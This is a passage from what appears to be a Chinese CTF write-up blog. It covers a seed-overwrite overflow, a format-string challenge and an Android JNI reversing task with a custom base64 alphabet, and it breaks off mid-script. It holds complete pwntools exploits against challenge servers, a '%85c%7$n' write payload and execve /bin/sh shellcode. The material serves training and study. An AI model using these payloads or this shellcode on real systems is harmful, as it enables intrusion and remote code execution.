不能直接控制 eip ，观察栈空间发现 v7 位于 seed 前面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-000000000000003C var_3C          dd ?</span><br><span class="line">-0000000000000038 var_38          dd ?</span><br><span class="line">-0000000000000034 var_34          dd ?</span><br><span class="line">-0000000000000030 v7              db ?</span><br><span class="line">-000000000000002F                 db ? ; undefined</span><br><span class="line">-000000000000002E                 db ? ; undefined</span><br><span class="line">…………</span><br><span class="line">…………</span><br><span class="line">-0000000000000010 seed            dd 2 dup(?)</span><br><span class="line">-0000000000000008 var_8           dq ?</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br></pre></td></tr></table></figure><p>随机数的随机性是基于 seed 种子，当固定 seed 时，实际上生成的是伪随机数，也就是一个固定的值。这道题几时利用 gets 造成栈溢出覆盖 seed 固定生成随机数，配合 ctypes 库实现 python、c 混合编程。</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;;debug&#x27;</span>;</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;111.198.29.45&quot;</span>,<span class="number">57280</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;;./b59204f56a0545e8a22f8518e749f19f&#x27;;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x20</span> + p64(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;;Your name:&#x27;</span>;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">num = <span class="built_in">str</span>(libc.rand()%<span class="number">6</span>+<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;;number:&#x27;</span>;)</span><br><span class="line">p.sendline(num)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p><strong>考点：格式化字符串任意地址写小数</strong></p><p>题目前面有几个条件循环绕过，反编译就能看出，不再赘述。看漏洞函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_400BB9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-7Ch]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You travel a short distance east.That&#x27;;s odd, anyone disappear suddenly&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;, what happend?! You just travel , and find another hole&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You recall, a big black hole will suckk you into it! Know what should you do?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;go into there(1), or leave(0)?:&quot;</span>);</span><br><span class="line">  _isoc99_scanf((__int64)<span class="string">&quot;%d&quot;</span>, (__int64)&amp;amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;A voice heard in your mind&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&#x27;;Give me an address&#x27;;&quot;</span>);</span><br><span class="line">    _isoc99_scanf((__int64)<span class="string">&quot;%ld&quot;</span>, (__int64)&amp;amp;v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And, you wish is:&quot;</span>);</span><br><span class="line">    _isoc99_scanf((__int64)<span class="string">&quot;%s&quot;</span>, (__int64)&amp;amp;format);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your wish is&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;amp;format, &amp;amp;format);                   <span class="comment">// 格式化字符串漏洞</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I hear it, I hear it....&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可控制的第一个参数是在 18 行，偏移为 7 。这里利用方式有多种，利用偏移 7 和 8 控制任意写入，也可只利用偏移 8 任意输入。（exp 使用偏移 7 和 8）</p><p>修改 v3 值后，绕过最后一个障碍。然后写入一段 shellcode 即可。shellcraft 生成的没有效果，就去 <a href="http://shell-storm.org/">http://shell-storm.org/</a> 找了一个。</p><p>完整 exp ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;;debug&#x27;</span>;</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;111.198.29.45&quot;</span>,<span class="number">48602</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./string&quot;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;secret[0] is &quot;</span>)</span><br><span class="line">v3 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;;\n&#x27;</span>;,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;v3:&quot;</span>+<span class="built_in">hex</span>(v3))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;secret[1] is &quot;</span>)</span><br><span class="line">v3_1 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;;\n&#x27;</span>;,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;v3_1:&quot;</span>+<span class="built_in">hex</span>(v3_1))</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = &quot;aaaaaaaa%p%p%p%p%p%p%p%p%p&quot;</span></span><br><span class="line"><span class="comment">#offset = 7</span></span><br><span class="line">payload = <span class="string">&quot;%85c%7$n&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;;a&#x27;</span>;*<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;up?:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;east&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;leave(0)?:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;address&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(v3))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;is:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%85c%7$n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = &quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span></span><br><span class="line">shellcode = <span class="string">&quot;\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;USE YOU SPELL&quot;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h2 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h2><h3 id="eastjni"><a href="#eastjni" class="headerlink" title="eastjni"></a>eastjni</h3><p><strong>考点：自定义密码表base加密、so</strong></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>前面的怎么定位 java 层关键位置就略过，查一下错误弹窗就能找到。</p><p>输入字符串会作为 mainactivity/a 的参数输入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">a</span><span class="params">(String paramString)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        a locala = <span class="keyword">new</span> com/a/easyjni/a;</span><br><span class="line">        locala.&lt;init&gt;();</span><br><span class="line">        bool = ncheck(locala.a(paramString.getBytes()));</span><br><span class="line">        <span class="keyword">return</span> bool;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception paramString)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (;;)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">boolean</span> bool = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后又作为 com/a/easyjni/a 的参数输入，到达第一层加密：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">char</span>[] a = &#123; <span class="number">105</span>, <span class="number">53</span>, <span class="number">106</span>, <span class="number">76</span>, <span class="number">87</span>, <span class="number">55</span>, <span class="number">83</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">54</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">118</span>, <span class="number">51</span>, <span class="number">110</span>, <span class="number">121</span>, <span class="number">52</span>, <span class="number">113</span>, <span class="number">56</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">50</span>, <span class="number">81</span>, <span class="number">43</span>, <span class="number">98</span>, <span class="number">100</span>, <span class="number">107</span>, <span class="number">89</span>, <span class="number">103</span>, <span class="number">75</span>, <span class="number">79</span>, <span class="number">73</span>, <span class="number">84</span>, <span class="number">47</span>, <span class="number">116</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">85</span>, <span class="number">114</span>, <span class="number">70</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">80</span>, <span class="number">122</span>, <span class="number">104</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">57</span>, <span class="number">66</span>, <span class="number">72</span>, <span class="number">67</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">112</span>, <span class="number">69</span>, <span class="number">97</span>, <span class="number">74</span>, <span class="number">82</span>, <span class="number">90</span>, <span class="number">78</span> &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">a</span><span class="params">(<span class="keyword">byte</span>[] paramArrayOfByte)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    StringBuilder localStringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= paramArrayOfByte.length - <span class="number">1</span>; i += <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">      <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (j &lt;= <span class="number">2</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (i + j &lt;= paramArrayOfByte.length - <span class="number">1</span>) &#123;</span><br><span class="line">          arrayOfByte[j] = ((<span class="keyword">byte</span>)(<span class="keyword">byte</span>)(k | (paramArrayOfByte[(i + j)] &amp; <span class="number">0xFF</span>) &gt;&gt;&gt; j * <span class="number">2</span> + <span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (k = (<span class="keyword">byte</span>)(((paramArrayOfByte[(i + j)] &amp; <span class="number">0xFF</span>) &lt;&lt; (<span class="number">2</span> - j) * <span class="number">2</span> + <span class="number">2</span> &amp; <span class="number">0xFF</span>) &gt;&gt;&gt; <span class="number">2</span>);; k = <span class="number">64</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          j++;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">          arrayOfByte[j] = ((<span class="keyword">byte</span>)k);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      arrayOfByte[<span class="number">3</span>] = ((<span class="keyword">byte</span>)k);</span><br><span class="line">      k = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (k &lt;= <span class="number">3</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (arrayOfByte[k] &lt;= <span class="number">63</span>) &#123;</span><br><span class="line">          localStringBuilder.append(a[arrayOfByte[k]]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (;;)</span><br><span class="line">        &#123;</span><br><span class="line">          k++;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">          localStringBuilder.append(<span class="string">&#x27;=&#x27;</span>);<span class="comment">//base</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> localStringBuilder.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每一个字符都进行一次加密，每轮加密都会有 &amp; 、&gt;&gt; 操作，且最后会加上 == ，推断是 base 加密。然后根据密码表 a 判断是自定义密码表的 base 加密方式。</p><p>第一次加密完成后的返回值作为 ncheck 的参数，这是一个加载的 so 中的函数：<code>System.loadLibrary(&quot;native&quot;);</code>。分析这个函数需要到 so 文件里面，so 文件在 lib/armeabi-v7a/libnative.so 。</p><p>进入到 ncheck 函数后，再进行两次加密，分别是：前 16 位与后 16 位互换；前 1 位与后 1 位互换：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __fastcall <span class="title">Java_com_a_easyjni_MainActivity_ncheck</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">…………</span><br><span class="line">  v6 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(*(<span class="keyword">int</span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, _DWORD))(*(_DWORD *)a1 + <span class="number">676</span>))(a1, a3, <span class="number">0</span>);<span class="comment">// 字符串传递给a1，a1指针取值到v6</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v6) == <span class="number">32</span> )                       <span class="comment">// base加密长度限制32位</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = &amp;s1[v7];                             <span class="comment">// s1[0]指针给v8</span></span><br><span class="line">      s1[v7] = v6[v7 + <span class="number">16</span>];                     <span class="comment">// s1[0]=v6[16]</span></span><br><span class="line">      v9 = v6[v7++];</span><br><span class="line">      v8[<span class="number">16</span>] = v9;                              <span class="comment">// s1[0+16]=v6[0]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v7 != <span class="number">16</span> );                         <span class="comment">// 循环16次，每次操作两个数</span></span><br><span class="line">                                                <span class="comment">// 相当于将前16位于后16位对调</span></span><br><span class="line">    (*(<span class="keyword">void</span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">const</span> <span class="keyword">char</span> *))(*(_DWORD *)v4 + <span class="number">680</span>))(v4, v5, v6);</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v12 = __OFSUB__(v10, <span class="number">30</span>);</span><br><span class="line">      v11 = v10 - <span class="number">30</span> &lt; <span class="number">0</span>;</span><br><span class="line">      v16 = s1[v10];</span><br><span class="line">      s1[v10] = s1[v10 + <span class="number">1</span>];                    <span class="comment">// s1[0]=s1[1]</span></span><br><span class="line">      s1[v10 + <span class="number">1</span>] = v16;                        <span class="comment">// s1[1]=s1[0]</span></span><br><span class="line">      v10 += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v11 ^ v12 );                        <span class="comment">// 相当于前一位与后一位对调位置</span></span><br><span class="line">    v13 = <span class="built_in">memcmp</span>(s1, <span class="string">&quot;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&quot;</span>, <span class="number">0x20</span>u);<span class="comment">//与密文比较</span></span><br><span class="line">…………</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>首先将密文：<code>MbT3sQgX039i3g==AQOoMQFPskB1Bsc7</code> 还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#手动完成前后 16 位互换</span></span><br><span class="line">c = <span class="built_in">list</span>(<span class="string">&quot;AQOoMQFPskB1Bsc7MbT3sQgX039i3g==&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">2</span>):</span><br><span class="line">v9 = c[i]</span><br><span class="line">c[i] = c[i+<span class="number">1</span>]</span><br><span class="line">c[i+<span class="number">1</span>] = v9</span><br><span class="line">c = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">print(<span class="string">&quot;flag:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(c))</span><br><span class="line"><span class="comment">#flag:QAoOQMPFks1BsB7cbM3TQsXg30i9g3==</span></span><br></pre></td></tr></table></figure><p>然后实现自定义密码表 base 解码，我找到的一个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义加密表</span></span><br><span class="line"><span class="comment">#s = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;#原版</span></span><br><span class="line">s = <span class="string">&quot;i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN&quot;</span><span class="comment">#自定义</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">My_base64_encode</span>(<span class="params">inputs</span>):</span></span><br><span class="line"><span class="comment"># 将字符串转化为2进制</span></span><br><span class="line">bin_str = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> inputs:</span><br><span class="line">x = <span class="built_in">str</span>(<span class="built_in">bin</span>(<span class="built_in">ord</span>(i))).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">bin_str.append(<span class="string">&#x27;&#123;:0&gt;8&#125;&#x27;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="comment">#print(bin_str)</span></span><br><span class="line"><span class="comment"># 输出的字符串</span></span><br><span class="line">outputs = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 不够三倍数，需补齐的次数</span></span><br><span class="line">nums = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> bin_str:</span><br><span class="line"><span class="comment">#每次取三个字符的二进制</span></span><br><span class="line">temp_list = bin_str[:<span class="number">3</span>]</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(temp_list) != <span class="number">3</span>):</span><br><span class="line">nums = <span class="number">3</span> - <span class="built_in">len</span>(temp_list)</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(temp_list) &lt; <span class="number">3</span>:</span><br><span class="line">temp_list += [<span class="string">&#x27;0&#x27;</span> * <span class="number">8</span>]</span><br><span class="line">temp_str = <span class="string">&quot;&quot;</span>.join(temp_list)</span><br><span class="line"><span class="comment">#print(temp_str)</span></span><br><span class="line"><span class="comment"># 将三个8字节的二进制转换为4个十进制</span></span><br><span class="line">temp_str_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">temp_str_list.append(<span class="built_in">int</span>(temp_str[i*<span class="number">6</span>:(i+<span class="number">1</span>)*<span class="number">6</span>],<span class="number">2</span>))</span><br><span class="line"><span class="comment">#print(temp_str_list)</span></span><br><span class="line"><span class="keyword">if</span> nums:</span><br><span class="line">temp_str_list = temp_str_list[<span class="number">0</span>:<span class="number">4</span> - nums]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> temp_str_list:</span><br><span class="line">outputs += s[i]</span><br><span class="line">bin_str = bin_str[<span class="number">3</span>:]</span><br><span class="line">outputs += nums * <span class="string">&#x27;=&#x27;</span></span><br><span class="line">print(<span class="string">&quot;Encrypted String:\n%s &quot;</span>%outputs)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">My_base64_decode</span>(<span class="params">inputs</span>):</span></span><br><span class="line"><span class="comment"># 将字符串转化为2进制</span></span><br><span class="line">bin_str = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> inputs:</span><br><span class="line"><span class="keyword">if</span> i != <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">x = <span class="built_in">str</span>(<span class="built_in">bin</span>(s.index(i))).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">bin_str.append(<span 